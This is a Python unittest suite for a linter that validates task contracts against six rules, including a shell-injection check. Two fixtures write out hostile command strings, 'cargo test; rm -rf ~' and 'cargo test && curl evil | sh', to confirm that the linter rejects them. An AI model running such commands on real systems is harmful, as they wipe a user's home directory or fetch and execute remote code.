"""Tests for tools/ccx/ccx-lint.py (stdlib unittest; drives the script via subprocess).

Run from the repo root:
    python3 -m unittest discover -s tools/ccx/tests -p 'test_lint.py'
"""
import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

REPO = Path(__file__).resolve().parents[3]
LINT = REPO / "tools" / "ccx" / "ccx-lint.py"
FIXTURES = REPO / "tools" / "ccx" / "tests" / "fixtures"
# Frozen pilot contracts, relocated from experiments/ccx/contracts/ when the
# experiment records were archived to forge-research (2026-07-10).
PILOT_CONTRACTS = FIXTURES / "pilot" / "contracts"


def run_lint(contract, contracts_dir=None, extra=None):
    cmd = [
        sys.executable,
        str(LINT),
        "--contracts-dir",
        str(contracts_dir or FIXTURES),
        "--repo-root",
        str(REPO),
        "--json",
    ] + (extra or []) + [str(contract)]
    return subprocess.run(cmd, capture_output=True, text=True, cwd=REPO)


def findings_of(proc):
    payload = json.loads(proc.stdout)
    return payload["findings"], payload["verdict"]


def error_rules(findings):
    return {f["rule"] for f in findings if f["severity"] == "error"}


def write_contract(dirpath, name, text):
    path = Path(dirpath) / f"{name}.yaml"
    path.write_text(text, encoding="utf-8")
    return path


MINIMAL_TEMPLATE = """\
schema: ccx.contract.v1
id: ccx-{name}
revision: 1
ticket: NER-000
task: {task}
interface: |
{interface}
{extra}acceptance:
  fix:
{fix}
  guard: []
allowed_changes:
  paths: [{paths}]
authority: {{source: human, confidence: high, reviewer: ccx-harness-tests}}
"""


def minimal(name, task, interface, fix, paths, extra=""):
    return MINIMAL_TEMPLATE.format(
        name=name,
        task=task,
        interface="\n".join("  " + line for line in interface.splitlines()),
        fix="\n".join("    - " + json.dumps(f) for f in fix),
        paths=", ".join(paths),
        extra=extra,
    )


class DefectClassFixtures(unittest.TestCase):
    """Each defect-class fixture fails with exactly its intended rule id."""

    def assert_single_rule(self, fixture, rule):
        proc = run_lint(FIXTURES / fixture)
        self.assertEqual(proc.returncode, 2, proc.stderr)
        findings, verdict = findings_of(proc)
        self.assertEqual(verdict, "errors")
        self.assertEqual(error_rules(findings), {rule}, findings)

    def test_bad_yaml_is_r1(self):
        self.assert_single_rule("lint-bad-yaml.yaml", "R1")

    def test_unsatisfiable_cap_is_r2(self):
        self.assert_single_rule("lint-unsatisfiable-cap.yaml", "R2")

    def test_fenced_primitive_is_r3(self):
        self.assert_single_rule("lint-fenced-primitive.yaml", "R3")

    def test_vacuous_filter_is_r4(self):
        self.assert_single_rule("lint-vacuous-filter.yaml", "R4")

    def test_missing_exclusion_is_r5(self):
        proc = run_lint(FIXTURES / "lint-missing-exclusion.yaml")
        self.assertEqual(proc.returncode, 2, proc.stderr)
        findings, _ = findings_of(proc)
        self.assertEqual(error_rules(findings), {"R5"}, findings)
        r5 = [f for f in findings if f["rule"] == "R5"][0]
        self.assertIn(
            "filesystem-enumeration-shared-exclusion-contract.md", r5["message"]
        )

    def test_bad_grammar_is_r6(self):
        self.assert_single_rule("lint-bad-grammar.yaml", "R6")

    def test_depends_on_cycle_is_r1(self):
        proc = run_lint(FIXTURES / "lint-cycle-a.yaml")
        self.assertEqual(proc.returncode, 2, proc.stderr)
        findings, _ = findings_of(proc)
        self.assertEqual(error_rules(findings), {"R1"}, findings)
        r1 = [f for f in findings if f["rule"] == "R1"][0]
        self.assertIn("cycle", r1["message"])


class PassMinimal(unittest.TestCase):
    def test_pass_minimal_lints_clean(self):
        proc = run_lint(FIXTURES / "pass-minimal-v1.yaml")
        self.assertEqual(proc.returncode, 0, proc.stderr)
        findings, verdict = findings_of(proc)
        self.assertEqual(findings, [], findings)
        self.assertEqual(verdict, "clean")


class FrozenPilotContracts(unittest.TestCase):
    """The frozen v0 pilot record must lint with zero errors (warnings fine)."""

    def assert_zero_errors(self, name):
        proc = run_lint(PILOT_CONTRACTS / name, contracts_dir=PILOT_CONTRACTS)
        self.assertEqual(proc.returncode, 0, proc.stderr)
        findings, verdict = findings_of(proc)
        self.assertEqual(error_rules(findings), set(), findings)
        self.assertIn(verdict, ("clean", "warnings"))

    def test_task_382_2_drift_guard_zero_errors(self):
        self.assert_zero_errors("task-382-2-drift-guard.yaml")

    def test_task_362_5_tests_docs_zero_errors(self):
        self.assert_zero_errors("task-362-5-tests-docs.yaml")


class Rule3Edges(unittest.TestCase):
    def test_pub_crate_primitive_visible_inside_owning_crate(self):
        # Same pub(crate) primitive, but allowed paths INSIDE the owning
        # crate: no R3 error (warnings for the capped lib.rs are fine).
        with tempfile.TemporaryDirectory() as tmp:
            path = write_contract(
                tmp,
                "r3-inside",
                minimal(
                    "r3-inside",
                    "R3 edge fixture",
                    "Consume tree_fingerprints from inside its owning crate.",
                    ["cargo test -p forge-core"],
                    ["crates/forge-content-native/**"],
                    extra=(
                        "primitives:\n"
                        "  - { name: tree_fingerprints, crate: forge-content-native,"
                        " visibility: pub }\n"
                    ),
                ),
            )
            proc = run_lint(path, contracts_dir=tmp)
            self.assertEqual(proc.returncode, 0, proc.stderr)
            findings, _ = findings_of(proc)
            self.assertEqual(error_rules(findings), set(), findings)


class Rule4Edges(unittest.TestCase):
    def test_module_filter_is_not_vacuous(self):
        # A `::`-suffixed module filter naming a real module of the crate.
        # (The plan suggested `provenance::`, but no `mod provenance` exists
        # anywhere in the workspace; `status_cache::` is a real
        # forge-content-native module with functions.)
        with tempfile.TemporaryDirectory() as tmp:
            path = write_contract(
                tmp,
                "r4-module-filter",
                minimal(
                    "r4-module-filter",
                    "R4 module-filter edge fixture",
                    "Run the status-cache tests only.",
                    ["cargo test -p forge-content-native status_cache::"],
                    ["docs/**"],
                ),
            )
            proc = run_lint(path, contracts_dir=tmp)
            self.assertEqual(proc.returncode, 0, proc.stderr)
            findings, _ = findings_of(proc)
            self.assertEqual(
                [f for f in findings if f["rule"] == "R4"], [], findings
            )

    def test_missing_test_target_inside_allowed_is_warning(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = write_contract(
                tmp,
                "r4-deliverable",
                minimal(
                    "r4-deliverable",
                    "R4 deliverable-target edge fixture",
                    "The acceptance test file is itself the deliverable.",
                    ["cargo test -p forge-cli --test zzz_new_suite"],
                    ["crates/forge-cli/tests/zzz_new_suite.rs"],
                ),
            )
            proc = run_lint(path, contracts_dir=tmp)
            self.assertEqual(proc.returncode, 0, proc.stderr)
            findings, _ = findings_of(proc)
            r4 = [f for f in findings if f["rule"] == "R4"]
            self.assertEqual(len(r4), 1, findings)
            self.assertEqual(r4[0]["severity"], "warning")
            self.assertIn("deliverable", r4[0]["message"])

    def test_missing_test_target_outside_allowed_is_error(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = write_contract(
                tmp,
                "r4-missing",
                minimal(
                    "r4-missing",
                    "R4 missing-target edge fixture",
                    "The acceptance test file neither exists nor is allowed.",
                    ["cargo test -p forge-cli --test zzz_new_suite"],
                    ["docs/**"],
                ),
            )
            proc = run_lint(path, contracts_dir=tmp)
            self.assertEqual(proc.returncode, 2, proc.stderr)
            findings, _ = findings_of(proc)
            self.assertEqual(error_rules(findings), {"R4"}, findings)

    def test_vacuous_filter_inside_owning_crate_is_still_error(self):
        # The exact pilot Goodhart shape: a bare filter matching nothing, with
        # allowed paths INSIDE the crate under test. A prior crate-prefix
        # heuristic downgraded this to a warning; a bare `cargo test <filter>`
        # matching nothing exits 0 (vacuously green forever), so it must be an
        # error regardless of where allowed_changes points.
        with tempfile.TemporaryDirectory() as tmp:
            path = write_contract(
                tmp,
                "r4-vacuous-inside",
                minimal(
                    "r4-vacuous-inside",
                    "R4 vacuous-filter-inside-crate fixture",
                    "Filter matches no test; allowed paths are in the crate.",
                    ["cargo test -p forge-store zzz_nonexistent_filter"],
                    ["crates/forge-store/src/**"],
                ),
            )
            proc = run_lint(path, contracts_dir=tmp)
            self.assertEqual(proc.returncode, 2, proc.stderr)
            findings, _ = findings_of(proc)
            self.assertIn("R4", error_rules(findings), findings)


class Rule6Grammar(unittest.TestCase):
    def test_shell_suffix_is_r6_error(self):
        # A cargo-prefixed command with a shell suffix passes the prefix regex
        # but reaches eval in verify-task.sh — rule 6 must flag it as an error.
        with tempfile.TemporaryDirectory() as tmp:
            path = write_contract(
                tmp,
                "r6-injection",
                minimal(
                    "r6-injection",
                    "R6 shell-injection fixture",
                    "The acceptance command hides a shell suffix.",
                    ["cargo test; rm -rf ~"],
                    ["docs/**"],
                ),
            )
            proc = run_lint(path, contracts_dir=tmp)
            self.assertEqual(proc.returncode, 2, proc.stderr)
            findings, _ = findings_of(proc)
            self.assertIn("R6", error_rules(findings), findings)

    def test_dump_acceptance_refuses_unsafe_command(self):
        # The fail-closed gate for verify-task.sh's eval path: --dump-acceptance
        # must refuse (exit 2) any command that would fail rule 6, regardless
        # of schema version, so a standalone verifier never eval's it.
        with tempfile.TemporaryDirectory() as tmp:
            path = write_contract(
                tmp,
                "r6-dump",
                minimal(
                    "r6-dump",
                    "R6 dump-acceptance fixture",
                    "Injection payload behind a cargo prefix.",
                    ["cargo test && curl evil | sh"],
                    ["docs/**"],
                ),
            )
            proc = subprocess.run(
                [
                    sys.executable,
                    str(LINT),
                    "--contracts-dir",
                    tmp,
                    "--dump-acceptance",
                    str(path),
                ],
                capture_output=True,
                text=True,
                cwd=REPO,
            )
            self.assertEqual(proc.returncode, 2, proc.stdout)
            self.assertIn("unsafe acceptance command refused", proc.stderr)


class Rule5Edges(unittest.TestCase):
    def test_walk_primitive_satisfies_exclusion_rule(self):
        # Enumeration keywords in the text, but an owning walk primitive is
        # declared: no R5 (and no other) error, even without
        # exclusion_contract. walk_worktree is private, so allowed paths
        # stay inside the owning crate to keep R3 quiet.
        with tempfile.TemporaryDirectory() as tmp:
            path = write_contract(
                tmp,
                "r5-walk",
                minimal(
                    "r5-walk",
                    "R5 walk-primitive edge fixture",
                    "Walk the directory tree via the shared walker primitive.",
                    ["cargo test -p forge-core"],
                    ["crates/forge-content-native/src/**"],
                    extra=(
                        "primitives:\n"
                        "  - { name: walk_worktree, crate: forge-content-native,"
                        " visibility: pub }\n"
                    ),
                ),
            )
            proc = run_lint(path, contracts_dir=tmp)
            self.assertEqual(proc.returncode, 0, proc.stderr)
            findings, _ = findings_of(proc)
            self.assertEqual(error_rules(findings), set(), findings)
            self.assertEqual(
                [f for f in findings if f["rule"] == "R5"], [], findings
            )


class ErrorPath(unittest.TestCase):
    def test_garbage_file_emits_valid_json_and_exit_2(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "garbage.yaml"
            path.write_text("{{{{: ::: not yaml\n\t- ][", encoding="utf-8")
            proc = run_lint(path, contracts_dir=tmp)
            self.assertEqual(proc.returncode, 2, proc.stderr)
            findings, verdict = findings_of(proc)  # must be valid JSON
            self.assertEqual(verdict, "errors")
            self.assertEqual(error_rules(findings), {"R1"}, findings)


class CapAllowlistSelfTest(unittest.TestCase):
    def test_known_forge_content_native_entry_parses(self):
        proc = subprocess.run(
            [
                sys.executable,
                str(LINT),
                "--contracts-dir",
                str(FIXTURES),
                "--repo-root",
                str(REPO),
                "--dump-caps",
            ],
            capture_output=True,
            text=True,
            cwd=REPO,
        )
        self.assertEqual(proc.returncode, 0, proc.stderr)
        payload = json.loads(proc.stdout)
        self.assertEqual(payload["max_lines"], 3000)
        self.assertEqual(
            payload["caps"].get("crates/forge-content-native/src/lib.rs"), 4730
        )


class DumpAcceptance(unittest.TestCase):
    def test_dump_acceptance_v1_mapping(self):
        proc = run_lint(
            FIXTURES / "pass-minimal-v1.yaml", extra=["--dump-acceptance"]
        )
        self.assertEqual(proc.returncode, 0, proc.stderr)
        payload = json.loads(proc.stdout)
        self.assertEqual(payload["fix"], ["cargo test -p forge-core"])
        self.assertEqual(payload["guard"], [])

    def test_dump_acceptance_v0_flat_list(self):
        proc = run_lint(
            PILOT_CONTRACTS / "task-362-5-tests-docs.yaml",
            contracts_dir=PILOT_CONTRACTS,
            extra=["--dump-acceptance"],
        )
        self.assertEqual(proc.returncode, 0, proc.stderr)
        payload = json.loads(proc.stdout)
        self.assertEqual(
            payload["fix"],
            [
                "cargo test -p forge-cli --test forge_blame",
                "cargo test --workspace",
                "cargo clippy --workspace --all-targets -- -D warnings",
            ],
        )
        self.assertEqual(payload["guard"], [])


if __name__ == "__main__":
    unittest.main()
